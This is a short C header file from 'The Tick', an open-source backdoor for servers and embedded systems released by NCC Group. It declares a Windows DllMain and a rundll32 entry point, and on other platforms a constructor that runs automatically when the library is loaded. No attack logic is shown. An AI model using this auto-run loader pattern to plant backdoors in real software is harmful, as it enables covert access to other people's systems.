/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#ifndef LIBMAIN_H
#define LIBMAIN_H

#include "common.h"

#ifdef _WIN32

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);

#if TICK_RUNDLL_ENTRY_POINT
void CALLBACK TICK_RUNDLL_ENTRY_POINT(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);
#endif

#else

// This attribute ensures the function is called when loading the library.
static void static_constructor(void) __attribute__((constructor));

// Main function.
int main(int argc, char *argv[]);

#endif

#endif /* LIBMAIN_H */
